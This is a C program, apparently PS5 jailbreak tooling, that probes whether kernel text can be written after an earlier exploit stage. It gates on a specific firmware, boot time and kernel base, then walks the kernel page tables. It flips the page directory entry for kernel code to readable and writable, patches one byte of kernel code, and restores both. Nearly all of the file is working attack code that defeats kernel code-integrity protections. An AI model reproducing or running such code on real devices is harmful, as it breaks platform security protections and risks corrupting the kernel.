#include <inttypes.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/sysctl.h>
#include <sys/time.h>
#include <ps5/kernel.h>

/* Rebuild for a fresh, verified post-AP boot. Defaults refuse all writes. */
#ifndef EXPECTED_BOOT_SEC
#define EXPECTED_BOOT_SEC 0
#endif
#ifndef EXPECTED_BOOT_USEC
#define EXPECTED_BOOT_USEC 0
#endif
#ifndef EXPECTED_TEXT_BASE
#define EXPECTED_TEXT_BASE 0
#endif
#ifndef EXPECTED_PDE
#define EXPECTED_PDE 0
#endif

#define DATA_CAVE_OFF 0x2D39000
#define CAVE_STATE_OFF 0x600
#define KH_OFF_USER 0x440
#define PMAP_STORE_OFF 0x3B48FF8
#define DMPML4I_OFF 0x3B49294
#define DMPDPI_OFF 0x3B49298
#define IDT_ARRAY_OFF 0x3BB4300
#define COMMON_TSS_OFF 0x3BB6FE0
#define CAVE_SAVE_OFF 0x620
#define HOOK_IST_OFF 0x4c
#define CONTEXT_OFF 0x2a1690
#define TARGET_OFF 0x2a1698
#define PHYS_MASK UINT64_C(0x000ffffffffff000)
#define STAGE_AP_COMPLETE UINT64_C(0x41505f434f4d504c)

static int rq(uint64_t addr, uint64_t *out)
{
    *out = 0;
    return kernel_copyout(addr, out, sizeof(*out));
}

static int restore_pde(uint64_t slot, uint64_t original)
{
    uint64_t actual = 0;
    int w = kernel_copyin(&original, slot, sizeof(original));
    int r = rq(slot, &actual);
    printf("WRITE_PROBE_PDE_RESTORE write_rc=%d read_rc=%d actual=0x%016" PRIx64 "\n",
           w, r, actual);
    fflush(stdout);
    return w || r || actual != original;
}

static int change_pde(uint64_t slot, uint64_t value, const char *phase)
{
    uint64_t actual = 0;
    int w = kernel_copyin(&value, slot, sizeof(value));
    int r = rq(slot, &actual);
    printf("WRITE_PROBE_%s write_rc=%d read_rc=%d actual=0x%016" PRIx64 "\n",
           phase, w, r, actual);
    fflush(stdout);
    return w || r || actual != value;
}

int main(void)
{
    if (!EXPECTED_BOOT_SEC || !EXPECTED_TEXT_BASE || !EXPECTED_PDE) {
        puts("WRITE_PROBE_UNARMED");
        return 2;
    }
    if (kernel_get_fw_version() != 0x13600007U) {
        puts("WRITE_PROBE_ABORT firmware");
        return 2;
    }
    struct timeval boot = {0};
    size_t boot_len = sizeof(boot);
    if (sysctlbyname("kern.boottime", &boot, &boot_len, NULL, 0) ||
        boot_len != sizeof(boot) ||
        boot.tv_sec != EXPECTED_BOOT_SEC ||
        boot.tv_usec != EXPECTED_BOOT_USEC) {
        puts("WRITE_PROBE_ABORT boot");
        return 1;
    }
    uint64_t base = KERNEL_ADDRESS_TEXT_BASE;
    if (base != EXPECTED_TEXT_BASE) {
        puts("WRITE_PROBE_ABORT text base");
        return 1;
    }
    uint64_t stage = 0, hook = 0, root = 0;
    uint64_t saved_lo = 0, saved_hi = 0, saved_ist = 0;
    uint64_t live_lo = 0, live_hi = 0, live_ist = 0;
    uint32_t pml4i = 0, pdpi = 0;
    if (rq(base + DATA_CAVE_OFF + KH_OFF_USER, &stage) ||
        rq(base + DATA_CAVE_OFF + CAVE_STATE_OFF, &hook) ||
        stage != STAGE_AP_COMPLETE || hook != 0 ||
        rq(base + DATA_CAVE_OFF + CAVE_SAVE_OFF, &saved_lo) ||
        rq(base + DATA_CAVE_OFF + CAVE_SAVE_OFF + 8, &saved_hi) ||
        rq(base + DATA_CAVE_OFF + CAVE_SAVE_OFF + 16, &saved_ist) ||
        rq(base + IDT_ARRAY_OFF + 16, &live_lo) ||
        rq(base + IDT_ARRAY_OFF + 24, &live_hi) ||
        rq(base + COMMON_TSS_OFF + HOOK_IST_OFF, &live_ist) ||
        saved_lo != live_lo || saved_hi != live_hi || saved_ist != live_ist ||
        kernel_copyout(base + DMPML4I_OFF, &pml4i, sizeof(pml4i)) ||
        kernel_copyout(base + DMPDPI_OFF, &pdpi, sizeof(pdpi)) ||
        rq(base + PMAP_STORE_OFF + 0x28, &root) || !root) {
        printf("WRITE_PROBE_ABORT stage=0x%016" PRIx64 " hook=0x%016" PRIx64 "\n",
               stage, hook);
        return 1;
    }
    uint64_t dmap = UINT64_C(0xffff800000000000) |
                    ((uint64_t)pml4i << 39) | ((uint64_t)pdpi << 30);
    uint64_t va = base + TARGET_OFF;
    uint64_t pml4e = 0, pdpe = 0, pde = 0;
    uint64_t slot = dmap + root + (((va >> 39) & 0x1ff) * 8);
    if (rq(slot, &pml4e) || !(pml4e & 1) || (pml4e & 0x80)) {
        puts("WRITE_PROBE_ABORT pml4");
        return 1;
    }
    slot = dmap + (pml4e & PHYS_MASK) + (((va >> 30) & 0x1ff) * 8);
    if (rq(slot, &pdpe) || !(pdpe & 1) || (pdpe & 0x80)) {
        puts("WRITE_PROBE_ABORT pdp");
        return 1;
    }
    slot = dmap + (pdpe & PHYS_MASK) + (((va >> 21) & 0x1ff) * 8);
    if (rq(slot, &pde) || pde != EXPECTED_PDE ||
        !(pde & 1) || !(pde & 0x80) || (pde & 2) ||
        !(pde & (UINT64_C(1) << 58))) {
        printf("WRITE_PROBE_ABORT pde=0x%016" PRIx64 "\n", pde);
        return 1;
    }
    printf("WRITE_PROBE_BEGIN boot=%jd.%06ld base=0x%016" PRIx64
           " target=0x%016" PRIx64 " pde=0x%016" PRIx64 "\n",
           (intmax_t)boot.tv_sec, (long)boot.tv_usec, base, va, pde);
    fflush(stdout);

    uint64_t readable = pde & ~(UINT64_C(1) << 58);
    if (change_pde(slot, readable, "READABLE")) {
        restore_pde(slot, pde);
        return 3;
    }
    const uint8_t expected[16] = {
        0xc3, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
        0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90
    };
    uint8_t before[16] = {0};
    int pre_rc = kernel_copyout(base + CONTEXT_OFF, before, sizeof(before));
    printf("WRITE_PROBE_PREIMAGE read_rc=%d matches=%u\n",
           pre_rc, !pre_rc && memcmp(before, expected, sizeof(before)) == 0);
    fflush(stdout);
    if (pre_rc || memcmp(before, expected, sizeof(before)) != 0) {
        restore_pde(slot, pde);
        return 4;
    }

    uint64_t writable = readable | 2;
    if (change_pde(slot, writable, "WRITABLE")) {
        restore_pde(slot, pde);
        return 5;
    }
    const uint8_t replacement = 0x66;
    const uint8_t original = 0x90;
    uint8_t changed = 0, restored = 0;
    int write_rc = kernel_copyin(&replacement, va, 1);
    int changed_rc = kernel_copyout(va, &changed, 1);
    printf("WRITE_PROBE_CHANGE write_rc=%d read_rc=%d byte=%02x\n",
           write_rc, changed_rc, changed);
    fflush(stdout);
    int restore_byte_rc = kernel_copyin(&original, va, 1);
    int restored_rc = kernel_copyout(va, &restored, 1);
    uint8_t after[16] = {0};
    int after_rc = kernel_copyout(base + CONTEXT_OFF, after, sizeof(after));
    printf("WRITE_PROBE_BYTE_RESTORE write_rc=%d read_rc=%d byte=%02x\n",
           restore_byte_rc, restored_rc, restored);
    printf("WRITE_PROBE_POSTIMAGE read_rc=%d matches=%u\n",
           after_rc, !after_rc && memcmp(after, expected, sizeof(after)) == 0);
    fflush(stdout);
    int restore_pde_rc = restore_pde(slot, pde);
    if (restore_pde_rc || restore_byte_rc || restored_rc || restored != original ||
        after_rc || memcmp(after, expected, sizeof(after)) != 0) {
        puts("WRITE_PROBE_RESTORE_FAILED; do not repeat");
        return 6;
    }
    if (write_rc || changed_rc || changed != replacement) {
        puts("WRITE_PROBE_NO_CONFIRMED_WRITE");
        return 7;
    }
    puts("WRITE_PROBE_COMPLETE; original byte and PDE restored");
    return 0;
}
